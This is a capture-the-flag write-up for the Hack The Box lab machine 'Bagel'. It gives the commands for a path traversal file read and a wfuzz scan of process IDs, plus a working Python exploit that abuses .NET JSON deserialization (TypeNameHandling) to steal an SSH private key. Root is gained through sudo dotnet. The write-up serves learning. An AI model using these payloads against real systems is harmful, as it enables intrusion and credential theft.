---
title: "Writeup Bagel"
date: 2023-07-26T16:17:25+02:00
draft: false
cover: "img/banners/bagel.webp"
---

## Intro

Bagel has been a challenging and interesting machine to solve that involved code analysis, WebExploitation, Object De-serialization and many other things.

---

## Recon

First step on any hacking exercise is to know what are we dealing with. First thing I run is a nmap scan to see opened ports. For those who don’t know, nmap is port scanning tool that tell us which ports and services are running on opened ports.

```Bash
nmap -p- --open -T5 -A -sCV -v 10.10.11.201
```
- _-p-_ makes nmap scan through all the 65535 ports
- _—open_ makes nmap display only open ports
- _-T5_ makes nmap perform a quicker but also agressive scan
- _-A_ option will try to detect OS version used
- _-sCV_ will attempt to detect service versions and run some default scripts
- _-v_ simply makes it verbose so it starts printing out which services are open before it completes the analysis.

Once the scan is completed, we get the following result:

```text
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.8 (protocol 2.0)
| ssh-hostkey: 
|   256 6e:4e:13:41:f2:fe:d9:e0:f7:27:5b:ed:ed:cc:68:c2 (ECDSA)
|_  256 80:a7:cd:10:e7:2f:db:95:8b:86:9b:1b:20:65:2a:98 (ED25519)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 400 Bad Request
|     Server: Microsoft-NetCore/2.0
|     Date: Wed, 05 Jul 2023 12:08:47 GMT
|     Connection: close
|   HTTPOptions: 
|     HTTP/1.1 400 Bad Request
|     Server: Microsoft-NetCore/2.0
|     Date: Wed, 05 Jul 2023 12:09:02 GMT
|     Connection: close
|   Help: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/html
|     Server: Microsoft-NetCore/2.0
|     Date: Wed, 05 Jul 2023 12:09:12 GMT
|     Content-Length: 52
|     Connection: close
|     Keep-Alive: true
|     <h1>Bad Request (Invalid request line (parts).)</h1>
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/html
|     Server: Microsoft-NetCore/2.0
|     Date: Wed, 05 Jul 2023 12:08:47 GMT
|     Content-Length: 54
|     Connection: close
|     Keep-Alive: true
|     <h1>Bad Request (Invalid request line (version).)</h1>
|   SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/html
|     Server: Microsoft-NetCore/2.0
|     Date: Wed, 05 Jul 2023 12:09:13 GMT
|     Content-Length: 52
|     Connection: close
|     Keep-Alive: true
|_    <h1>Bad Request (Invalid request line (parts).)</h1>
8000/tcp open  http-alt Werkzeug/2.2.2 Python/3.10.9
| http-methods: 
|_  Supported Methods: HEAD GET OPTIONS
|_http-server-header: Werkzeug/2.2.2 Python/3.10.9
| http-title: Bagel &mdash; Free Website Template, Free HTML5 Template by fr...
|_Requested resource was http://bagel.htb:8000/?page=index.html
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/2.2.2 Python/3.10.9
|     Date: Wed, 05 Jul 2023 12:08:47 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.1 302 FOUND
|     Server: Werkzeug/2.2.2 Python/3.10.9
|     Date: Wed, 05 Jul 2023 12:08:42 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 263
|     Location: http://bagel.htb:8000/?page=index.html
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|     <p>You should be redirected automatically to the target URL: <a href="http://bagel.htb:8000/?page=index.html">http://bagel.htb:8000/?page=index.html</a>. If not, click the link.
|   Socks5: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request syntax ('
|     ').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
======================================SNIP=====================================
```
We see that port 8000 is open with what appears to be a web server, so let’s see what’s on it.

![](/img/machines/bagel/port8000webapp.webp)

We see that it redirected us to bagel.htb so we add that to our /etc/hosts file and refresh.

![](/img/machines/bagel/webpageindex.webp)

First thing that came to my attention was the URL: It seems that it’s selecting the page to show on the page parameter in the URL. Experience tells me that this is a potential place to exploit a Path Traversal and/or LFI vulnerability, so I tried changing index.html with /etc/passwd.

![](/img/machines/bagel/filenotfound.webp)

It appears not to be found, so let’s try to make some Path Traversal.

![](/img/machines/bagel/pathtraversal.webp)

Using this on the page parameter I managed to download the passwd file.

```text
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
tss:x:59:59:Account used for TPM access:/dev/null:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/usr/sbin/nologin
systemd-oom:x:999:999:systemd Userspace OOM Killer:/:/usr/sbin/nologin
systemd-resolve:x:193:193:systemd Resolver:/:/usr/sbin/nologin
polkitd:x:998:997:User for polkitd:/:/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
abrt:x:173:173::/etc/abrt:/sbin/nologin
setroubleshoot:x:997:995:SELinux troubleshoot server:/var/lib/setroubleshoot:/sbin/nologin
cockpit-ws:x:996:994:User for cockpit web service:/nonexisting:/sbin/nologin
cockpit-wsinstance:x:995:993:User for cockpit-ws instances:/nonexisting:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/usr/share/empty.sshd:/sbin/nologin
chrony:x:994:992::/var/lib/chrony:/sbin/nologin
dnsmasq:x:993:991:Dnsmasq DHCP and DNS server:/var/lib/dnsmasq:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin
systemd-coredump:x:989:989:systemd Core Dumper:/:/usr/sbin/nologin
systemd-timesync:x:988:988:systemd Time Synchronization:/:/usr/sbin/nologin
developer:x:1000:1000::/home/developer:/bin/bash
phil:x:1001:1001::/home/phil:/bin/bash
_laurel:x:987:987::/var/log/laurel:/bin/false
```
Some information is revealed to us, such as the users present in the system (developer and phil).
After that, I didn’t really know how to go further away until I found out that I could enumerate processes thanks to a folder where commands of a given PID are stored. Since I can read files, I could read which command each process on the computer is running by reading the /proc/self/cmdline file.

![](/img/machines/bagel/pidcmdline.webp)

It downloaded a file again, this time being a txt of the command that runs the web server. As we have the route (/home/developer/app/app.py) we can try to read this file by downloading it using the path traversal payload.

```python
from flask import Flask, request, send_file, redirect, Response
import os.path
import websocket,json

app = Flask(__name__)

@app.route('/')
def index():
        if 'page' in request.args:
            page = 'static/'+request.args.get('page')
            if os.path.isfile(page):
                resp=send_file(page)
                resp.direct_passthrough = False
                if os.path.getsize(page) == 0:
                    resp.headers["Content-Length"]=str(len(resp.get_data()))
                return resp
            else:
                return "File not found"
        else:
                return redirect('http://bagel.htb:8000/?page=index.html', code=302)

@app.route('/orders')
def order(): # don't forget to run the order app first with "dotnet <path to .dll>" command. Use your ssh key to access the machine.
    try:
        ws = websocket.WebSocket()    
        ws.connect("ws://127.0.0.1:5000/") # connect to order app
        order = {"ReadOrder":"orders.txt"}
        data = str(json.dumps(order))
        ws.send(data)
        result = ws.recv()
        return(json.loads(result)['ReadOrder'])
    except:
        return("Unable to connect")

if __name__ == '__main__':
  app.run(host='0.0.0.0', port=8000)
```
We can see that there are two routes: The root (the one we were accessing all the time) and other called /orders which seems to be calling a WebSocket requesting to read a file called orders.txt. At first I tried to read some file like the id_rsa of both of the users we found, but with no results. This was the script I tried.

```python
import websocket
import json

ws = websocket.WebSocket()
ws.connect("ws://bagel.htb:5000/") # connect to order app
order = {"ReadOrder":"../../../../home/phil/.ssh/id_rsa"}
data = str(json.dumps(order))
ws.send(data)
result = ws.recv()
print(json.loads(result))
```
![](/img/machines/bagel/testpyrun.webp)

So with this not working, I started to look more carefully at the code given on app.py and this line got my eye.

![](/img/machines/bagel/rememberdll.webp)

So the comment is saying that an app should be run before the server and it is a .NET file. It also sugests that we should connect using an SSH key.
Since we know this app is running and, of course it’s a process and it has a PID, we can apply the same technique than before to get the source code of that .NET application and see what it does.
Since we don’t know the PID of the app, we will have to brute force it. I will use WFUZZ for that. The options I will use are:

- _-z_: To use a payload. In this specific situation, I will use range,1–1000, which will put numbers from 1 to 1000 wherever the FUZZ word is and so it will fuzz that same parameter, in this case, the PID of the process.
- _-ss_: to specify some content that we want on the file, in this case we want it to contain dotnet since it is how the comment on the app.py code says the app will run.
- _-u_: to indicate the URL to perform the attack.

```bash
wfuzz -c -z range,1-10000 --ss dotnet -u "http://bagel.htb:8000/?page=../../../../../../proc/FUZZ/cmdline"
```
![](/img/machines/bagel/wfuzz.webp)

We get some PIDs, so let’s look at them and see what we find.

![](/img/machines/bagel/cmdlinedll.webp)

Luckily, the first of them tells us where the file is located, so no more looking onto the others.
Now, let’s download it with the same method as we’ve been doing. It will download the bagel.dll file. I tried to analyze it with ghidra with no results, so I researched a bit and the best way to perform an analysis on .dll files is to use [dnSpy](https://github.com/dnSpy/dnSpy). This tool allows to see and debug code on .dll.
When loading the file into dnSpy we get quite a lot of files. I recommend you to go over them before continuing since it will give you more details on what are we doing.

![](/img/machines/bagel/dllanalysis.webp)

We see we have some packages here, so let’s see what’s interesting on each of them:

![](/img/machines/bagel/serializedeserializeused.webp)

On the Bagel package we see one of the functions that sets a Handler (see bellow) that is calling a Deserialize and a Serialize method, so let’s see what are those guys doing:

![](/img/machines/bagel/codeofserialdeserial.webp)

What calls out my attention of this code-block is the TypeNameHandling=4. Some research reveals that this option allows us to set the Type Name of the object.

![](/img/machines/bagel/docnamehandling.webp)

Having a Serialization with a TypeNameHandling different to 0 can be dangerous and vulnerable to Serialization attacks, since we can chang the $type parameter to any other we want. More info can be found on this [blogpost](https://systemweakness.com/exploiting-json-serialization-in-net-core-694c111faa15)
Taking a look at the Orders package we find another interesting piece of code:

![](/img/machines/bagel/orderspackage.webp)

This appears to give us some insights on the actions that can be taken on the Orders. We see on the ReadOrder method that it’s replacing all / and .. with no-separation characters, which explains why we could not make any path traversal to get the .ssh previously.
There appears to be another method called WriteOrder, which writes things to the order and then we have a method called RemoveOrder that has no actions yet. This is key, since as said in the docs of TypeNameHandling if the type serialized and the declared do not match. That means that we could potentially re-define the type to be any other that we want. It would be interesting to re-define it to be ReadFile, which does not have restrictions and would allow us to read the id_rsa file.

![](/img/machines/bagel/file.webp)

---

## Exploitation

### User

Now we have a good understanding of what’s going on and have a plausible entrance vecor, so with that, let’s craft a payload.

```json
{
  "RemoveOrder":
  {
    "$type":"bagel_server.File, bagel",
    "ReadFile":"../../../../home/phil/.ssh/id_rsa"
  }
}
```
We are telling the RemoveOrder object that now it will be a File type and should perform the action ReadFile. Since the TypeNameHandler was set to 4, we are allowed to do that and once the object is de-serialized it will perform the action.
The exploit code is this one:

```python
import websocket
import json

ws = websocket.WebSocket()
ws.connect("ws://bagel.htb:5000/") # connect to order app
order = {"RemoveOrder": {"$type": "bagel_server.File, bagel", "ReadFile":"../../../../home/phil/.ssh/id_rsa"}}
data = str(json.dumps(order))
ws.send(data)
result = ws.recv()
print(json.loads(result))
```
This will print out the private SSH key. We just have to include it on a file, give to it the permission 600 and then, connect through SSH with the following command:

```bash
ssh -i key phil@bagel.htb
```
And this will give us access to the machine, where we can see the user.txt

![](/img/machines/bagel/user.webp)

---

### Root

Time to PrivEsc! First of all, let’s see if we can run any command as sudo:

![](/img/machines/bagel/sudo-l.webp)

Seems that we can’t run anything as sudo with this user…
Remember that on the passwd file we found out that the existing users where phil and developer. We have the credentials of developer, if you took a look at the files of the .dll you surely saw those ones.

![](/img/machines/bagel/sqlcreds.webp)

![](/img/machines/bagel/userdev.webp)

It appears to work, so let’s see if we can run anything as root.

![](/img/machines/bagel/sudo-l2.webp)

So indeed we can run dotnet as sudo. _gtfobins_ has [this](https://gtfobins.github.io/gtfobins/dotnet/) entry where they show how we can gain root access with dotnet. Following the steps gives us root access.

![](/img/machines/bagel/root.webp)

---
## Conclusion

That was a really really fun machine to solve. I really enjoyed it and learned a lot of new things. With no doubt one of my favorites.
